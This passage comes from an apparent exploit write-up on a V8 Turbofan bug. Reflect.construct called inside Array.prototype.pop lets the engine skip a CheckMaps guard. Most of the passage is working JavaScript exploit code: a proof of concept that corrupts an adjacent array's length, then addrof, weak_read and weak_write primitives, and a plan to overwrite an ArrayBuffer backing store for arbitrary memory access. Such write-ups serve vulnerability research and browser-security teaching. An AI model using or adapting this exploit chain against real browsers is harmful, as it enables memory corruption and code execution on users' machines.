</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">RelyOnMapsViaStability</span>(<span style="color:#a6e22e">dependencies</span>)) <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">CHECK</span>(<span style="color:#a6e22e">RelyOnMapsHelper</span>(<span style="color:#a6e22e">nullptr</span>, <span style="color:#a6e22e">jsgraph</span>, <span style="color:#a6e22e">effect</span>, <span style="color:#a6e22e">control</span>, <span style="color:#a6e22e">feedback</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">MapInference</span><span style="color:#f92672">::</span><span style="color:#a6e22e">RelyOnMapsHelper</span>(<span style="color:#a6e22e">CompilationDependencies</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">dependencies</span>,
</span></span><span style="display:flex;"><span>                                    <span style="color:#a6e22e">JSGraph</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">jsgraph</span>, <span style="color:#a6e22e">Node</span><span style="color:#f92672">**</span> <span style="color:#a6e22e">effect</span>,
</span></span><span style="display:flex;"><span>                                    <span style="color:#a6e22e">Node</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">control</span>,
</span></span><span style="display:flex;"><span>                                    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">FeedbackSource</span><span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">feedback</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Safe</span>()) <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">auto</span> <span style="color:#a6e22e">is_stable</span> <span style="color:#f92672">=</span> [<span style="color:#66d9ef">this</span>](<span style="color:#a6e22e">Handle</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Map</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">map</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">MapRef</span> <span style="color:#a6e22e">map_ref</span>(<span style="color:#a6e22e">broker_</span>, <span style="color:#a6e22e">map</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">map_ref</span>.<span style="color:#a6e22e">is_stable</span>();
</span></span><span style="display:flex;"><span>  };
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">dependencies</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">nullptr</span> <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">all_of</span>(<span style="color:#a6e22e">maps_</span>.<span style="color:#a6e22e">cbegin</span>(), <span style="color:#a6e22e">maps_</span>.<span style="color:#a6e22e">cend</span>(), <span style="color:#a6e22e">is_stable</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#a6e22e">Handle</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Map</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">map</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">maps_</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">dependencies</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">DependOnStableMap</span>(<span style="color:#a6e22e">MapRef</span>(<span style="color:#a6e22e">broker_</span>, <span style="color:#a6e22e">map</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SetGuarded</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">feedback</span>.<span style="color:#a6e22e">IsValid</span>()) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">InsertMapChecks</span>(<span style="color:#a6e22e">jsgraph</span>, <span style="color:#a6e22e">effect</span>, <span style="color:#a6e22e">control</span>, <span style="color:#a6e22e">feedback</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
We can observe that a call to <code>MapInference::Safe()</code> will be done, and if succesful, the function will return immediately. The implementation of this function is the following:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">MapInference</span><span style="color:#f92672">::</span><span style="color:#a6e22e">Safe</span>() <span style="color:#66d9ef">const</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">maps_state_</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">kUnreliableNeedGuard</span>; }</span></span></code></pre></div>
Because the <code>JSCreate</code> node was never marked as <code>kUnreliableReceiverMaps</code>, this function will always return true. This comparative operation can be shown below.</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">maps_state_</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">result</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">NodeProperties</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kUnreliableReceiverMaps</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">?</span> <span style="color:#a6e22e">kUnreliableDontNeedGuard</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">:</span> <span style="color:#a6e22e">kReliableOrGuarded</span>;</span></span></code></pre></div>
The code path that should mitigate this vulnerability is the one in which the function <code>InsertMapChecks</code> is invoked. This function will be in charge to add a <code>CheckMaps</code> node before the effect nodes loading and storing the popped element from the receiver object takes place, assuring that a correct map will be used for these operations.</p>
<p>We can see that if we invoke <code>Reflect.construct</code> outside the context of <code>Array.prototype.pop</code>, a <code>CheckMaps</code> node is inserted, as it should for the conventional use of this function:</p>
<p><img src="https://tmpout.sh/2/img/Pasted%20image%2020220112204523.png#center" alt=""></p>
<p>However, if the invocation of <code>Reflect.construct</code> is within <code>Array.protoype.pop</code> context, this will trigger the vulnerability and Turbofan will assume that the map of the receiver object is reliable and will not add a <code>CheckMaps</code> node as show below:</p>
<p><img src="https://tmpout.sh/2/img/Pasted%20image%2020220112204615.png#center" alt=""></p>
<!-- raw HTML omitted -->
<hr>
<h3 id="exploit-strategy">Exploit Strategy<a href="#exploit-strategy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>As previously mentioned, this vulnerability allows us to trivially craft <code>addrof</code> and <code>fakeobj</code> primitives. A common technique to exploit the current scenario, in which only <code>addrof</code> and <code>fakeobj</code> primitives are available without OOB read/write, is by crafting a fake <code>ArrayBuffer</code> object with an arbitrary backing pointer. However, this approach becomes difficult with V8&rsquo;s <a href="https://v8.dev/blog/pointer-compression">pointer compression</a> enabled since <a href="https://v8.dev/blog/v8-release-80">version 8.0</a>.</p>
<p>This is because with pointer compression, tagged pointers are stored within V8&rsquo;s heap as <code>dwords</code>, while double values are stored as <code>qwords</code>. This implicitly impacts our ability to create an effective <code>fakeobj</code> primitive for this specific scenario.</p>
<p><em>If you are interested in knowing how this exploit would look like without pointer compression here is a really nice writeup by <a href="https://leethax0.rs/2021/04/ElectricChrome/">@HawaiiFive0day</a>.</em></p>
<p>In order to exploit this vulnerability, we have to use a different approach that will leverage the mechanics of V8&rsquo;s pointer compression to our advantage.</p>
<p>As previously mentioned, when a new indexed property of different <em>elements kind</em> gets stored into array <code>a</code>, the array will be reallocated, and their elements updated corresponding to the new array&rsquo;s <em>elements kind</em> transition.</p>
<p>However, this leaves for an interesting caveat that is useful for absuing pointer compression-enabled element transitioning. If the elements of the subject array are originally of elements kind <code>PACKED_DOUBLE_ELEMENTS</code> and this array is transitioning to <code>PACKED_ELEMENTS</code>, this will ultimately create an array half of the size of the original one, since <code>PACKED_ELEMENTS</code> corresponds to elements stored as <code>dword</code> tagged pointers when pointer compression is enabled, in contrast to double values stored as <code>qwords</code> as previously mentioned.</p>
<p>Since the map inference of the array is incorrect after the array has transitioned to <code>PACKED_ELEMENTS</code> and any <code>JSArray</code> builtin function is subject to this wrong map inference, we can abuse this scenario to achieve OOB read/write via the use of <code>Array.prototype.pop</code> and <code>Array.prototype.push</code>.</p>
<p>However, there is a more convenient avenue for exploitation documented by <a href="https://blog.exodusintel.com/2020/02/24/a-eulogy-for-patch-gapping-chrome/">Exodus Intelligence</a>. Instead of recurrently using <code>JSArray</code> builtin functions as <code>Array.prototype.pop</code> and <code>Array.prototype.push</code> to read and write memory, a single OOB write can be leveraged to overwrite the length field of an adjacent array in memory. This will enable an easier approach to build stronger primitives moving forward. Here is a PoC for this exploitation strategy:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> [,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,<span style="color:#ae81ff">1.1</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">b</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">empty</span>() {}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">f</span>(<span style="color:#a6e22e">nt</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">push</span>(<span style="color:#66d9ef">typeof</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">construct</span>(<span style="color:#a6e22e">empty</span>, <span style="color:#a6e22e">arguments</span>, <span style="color:#a6e22e">nt</span>)) <span style="color:#f92672">===</span> Proxy
</span></span><span style="display:flex;"><span>           <span style="color:#f92672">?</span> <span style="color:#ae81ff">2.2</span>
</span></span><span style="display:flex;"><span>           <span style="color:#f92672">:</span> <span style="color:#ae81ff">2261634.000029185</span> <span style="color:#75715e">//0x414141410000f4d2 -&gt; 0xf4d2 = 31337 * 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Proxy(Object, {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">get</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.2</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> Object.<span style="color:#a6e22e">prototype</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">main</span>(<span style="color:#a6e22e">o</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">f</span>(<span style="color:#a6e22e">o</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">PrepareFunctionForOptimization</span>(<span style="color:#a6e22e">empty</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">PrepareFunctionForOptimization</span>(<span style="color:#a6e22e">f</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">PrepareFunctionForOptimization</span>(<span style="color:#a6e22e">main</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>(<span style="color:#a6e22e">empty</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>(<span style="color:#a6e22e">empty</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">OptimizeFunctionOnNextCall</span>(<span style="color:#a6e22e">main</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>(<span style="color:#a6e22e">p</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">length</span>);   <span style="color:#75715e">// prints 31337
</span></span></span></code></pre></div>
<!-- raw HTML omitted --></p>
<hr>
<h2 id="achieving-relative-arbitrary-readwrite">Achieving Relative Arbitrary Read/Write<a href="#achieving-relative-arbitrary-readwrite" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Once we have achieved OOB read/write and successfully overwritten the length of an adjacent array, we can now read/write into adjacent memory.</p>
<p>From this point forward, we can neglect the original vulnerability, and think of the next sections independently of the specific vulnerability as long as we can achive OOB read/write from a JSArray with <code>PACKED_DOUBLE_ELEMENTS</code> <em>elements kind</em>.</p>
<p>In order to read/write memory with more flexibility, we need to build a set of read/write primitives as well as to gain the ability to retrieve the address of arbitrary objects via an <code>addrof</code> primitive.</p>
<p>This can be done by replacing the value of the elements tagged pointer of an adjacent double array (<code>c</code>) via our OOB double array (<code>b</code>). If we replace the value of this field we will be able to dereference its contents while accessing the elements of <code>c</code>, ultimately enabling us to read or write to tagged pointers.</p>
<p>In addition, an <code>addrof</code> primitive can be achieved by leaking the maps of adjacent boxed/unboxed arrays, and interchanging these also in an adjacent double array.</p>
<p>The implementation of these primitives having our preliminar OOB access can be shown as follows:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> [,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,<span style="color:#ae81ff">1.1</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">b</span>;
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span><span style="color:#75715e">//triggering Turbofan side-effect bug leveraging OOB write to b
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">oob</span>();
</span></span><span style="display:flex;"><span><span style="color:#75715e">// adjacent OOB-accesible arrays from double array b
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.1</span>]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> [{}, {}];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//leaking maps of boxed/unboxed adjacent arrays
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flt_map</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">b</span>[<span style="color:#ae81ff">14</span>]) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">obj_map</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">b</span>[<span style="color:#ae81ff">25</span>]) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">obj</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">tmp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>[<span style="color:#ae81ff">14</span>]; <span style="color:#75715e">// accesing array c&#39;s map tagged pointer    
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">tmp_elm</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">c</span>[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// overwritting only higher dword
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">b</span>[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(((<span style="color:#a6e22e">obj_map</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>) <span style="color:#f92672">+</span> (<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">tmp</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span><span style="color:#a6e22e">n</span>)));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">c</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">b</span>[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(((<span style="color:#a6e22e">flt_map</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>) <span style="color:#f92672">+</span> (<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">tmp</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span><span style="color:#a6e22e">n</span>)));  
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">leak</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">c</span>[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">b</span>[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">tmp</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">c</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">tmp_elm</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">leak</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">weak_read</span>(<span style="color:#a6e22e">addr</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">tmp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>[<span style="color:#ae81ff">15</span>]; <span style="color:#75715e">// accessing elements pointer of c
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">b</span>[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>((((<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">addr</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">n</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>) <span style="color:#f92672">+</span> (<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">tmp</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span><span style="color:#a6e22e">n</span>)));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">c</span>[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">b</span>[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">tmp</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">weak_write</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">what</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">tmp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>[<span style="color:#ae81ff">15</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">b</span>[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>((((<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">addr</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">n</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>) <span style="color:#f92672">+</span> (<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">tmp</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span><span style="color:#a6e22e">n</span>)));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">c</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">what</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">b</span>[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">tmp</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
<!-- raw HTML omitted --></p>
<hr>
<h2 id="achieving-unstable-arbitrary-readwrite">Achieving Unstable Arbitrary Read/Write<a href="#achieving-unstable-arbitrary-readwrite" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Unfortunately, this primitive is restricted to 8 bytes per operation to V8&rsquo;s tagged pointers, hence the <code>weak</code> prefix as these primitives are relative to V8&rsquo;s heap.</p>
<p>In order to circumvent this limitation, we will have to perform the following steps to build a stronger read/write primitive:</p>
<ul>
<li>Leak <code>isolate root</code> to resolve any V8 tagged pointer to its unboxed representation.</li>
<li>Overwrite the unboxed <code>backing_store</code> pointer of an ArrayBuffer and access it via a DataView object, enabling us to read and write memory to unboxed addresses, with sizes not limited to 8 bytes per operation.</li>
</ul>
<p>In order to leak the value of <code>isolate root</code>, we can leverage our <code>weak_read</code> primitive to leak the value of <code>external_pointer</code> from a typed array. To illustrate this, let&rsquo;s take a look at the fields of a <code>Uint8Array</code> object:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">d8</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>(<span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">d8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">a</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">DebugPrint</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3fee080c5e69</span><span style="color:#f92672">:</span> [<span style="color:#a6e22e">JSTypedArray</span>]
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">map</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3fee082804e1</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Map</span>(<span style="color:#a6e22e">UINT8ELEMENTS</span>)<span style="color:#f92672">&gt;</span> [<span style="color:#a6e22e">FastProperties</span>]
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">prototype</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3fee082429b9</span> <span style="color:#f92672">&lt;</span>Object <span style="color:#a6e22e">map</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3fee08280509</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">elements</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3fee080c5e59</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">ByteArray</span>[<span style="color:#ae81ff">8</span>]<span style="color:#f92672">&gt;</span> [<span style="color:#a6e22e">UINT8ELEMENTS</span>]
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">embedder</span> <span style="color:#a6e22e">fields</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">buffer</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3fee080c5e21</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">ArrayBuffer</span> <span style="color:#a6e22e">map</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3fee08281189</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">byte_offset</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">byte_length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">data_ptr</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3fee080c5e60</span>  <span style="color:#f92672">&lt;-------------------------------</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">-</span> <span style="color:#a6e22e">base_pointer</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x80c5e59</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">-</span> <span style="color:#a6e22e">external_pointer</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3fee00000007</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">properties</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3fee080406e9</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">FixedArray</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">&gt;</span> {}
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">elements</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3fee080c5e59</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">ByteArray</span>[<span style="color:#ae81ff">8</span>]<span style="color:#f92672">&gt;</span> {
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">0</span><span style="color:#f92672">-</span><span style="color:#ae81ff">7</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span> }
